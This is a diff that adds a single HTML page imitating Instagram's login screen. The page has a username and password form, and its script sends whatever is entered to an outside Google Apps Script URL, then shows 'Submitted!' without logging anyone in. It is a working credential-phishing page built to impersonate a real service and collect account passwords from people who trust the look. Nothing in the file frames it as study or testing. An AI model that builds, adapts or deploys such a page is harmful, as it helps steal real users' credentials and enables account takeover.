@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram Style Login</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', sans-serif; background-color: #fafafa; }
+    .wrapper { display: flex; min-height: 100vh; flex-direction: row; }
+    .left {
+      flex: 1;
+      background-image: url("original_files/instagram-web-lox-image.png");
+      background-size: cover;
+      background-position: center;
+    }
+    .right {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 40px;
+    }
+    .right h1 { font-size: 32px; margin-bottom: 24px; }
+    .form { width: 100%; max-width: 320px; }
+    .form input {
+      width: 100%; margin: 8px 0; padding: 12px;
+      border: 1px solid #dbdbdb; border-radius: 4px;
+      font-size: 14px; background-color: #fff;
+    }
+    .form button {
+      width: 100%; padding: 12px;
+      background-color: #0095f6; color: white; border: none;
+      font-weight: bold; border-radius: 4px;
+      margin-top: 12px; cursor: pointer;
+    }
+    .form button:hover { background-color: #007cd1; }
+    .bottom-text {
+      margin-top: 20px; font-size: 13px;
+      color: #8e8e8e; text-align: center;
+    }
+    @media (max-width: 768px) {
+      .wrapper { flex-direction: column; }
+      .left { height: 300px; }
+      .right { padding: 20px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="left"></div>
+    <div class="right">
+      <h1>Login</h1>
+      <form class="form" id="login-form">
+        <input name="username" type="text" placeholder="Username or Email" required />
+        <input name="password" type="password" placeholder="Password" required />
+        <button type="submit">Log In</button>
+      </form>
+      <div class="bottom-text">
+        Don’t have an account? <a href="#">Sign up</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- JS to send form data to Google Apps Script -->
+  <script>
+    const form = document.getElementById('login-form');
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const data = new FormData(form);
+      fetch("https://script.google.com/macros/s/AKfycbwISpAh5T-RfRHcvgieYAOynujfS4gvZSXij5m3Hjoq8Njj-aLbdyATvO44boR83_FRpg/exec", {
+        method: "POST",
+        body: data
+      })
+      .then(response => alert("Submitted!"))
+      .catch(error => alert("Error occurred"));
+    });
+  </script>
+</body>
+</html>
